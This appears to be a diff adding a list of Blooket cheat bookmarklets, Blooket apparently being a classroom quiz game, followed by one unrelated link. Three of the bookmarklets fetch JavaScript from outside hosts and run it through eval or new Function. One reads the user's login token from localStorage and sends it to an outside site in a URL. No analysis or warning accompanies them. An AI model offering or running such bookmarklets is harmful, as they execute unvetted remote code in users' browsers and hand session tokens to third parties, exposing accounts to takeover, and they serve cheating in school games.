@@ -1,0 +1,5 @@
+javascript:fetch('https://www.gbasil.dev/api/blooket/bookmarkletv2').then(res => res.text().then(t => eval(t)))
+javascript:fetch('https://www.gbasil.dev/api/blooket/bookmarklet').then(res => res.text().then(t => eval(t)))
+javascript:if (localStorage.token == undefined) {alert('Please log in!')} else {window.open('https://gbasil.dev/blooket?token=' + localStorage.token)}
+javascript:fetch('https://thatfrueddued.github.io/blooket-utility/index.js').then(r=>r.text()).then(t=>(new Function(t))())
+https://lr.conundrumer.com/
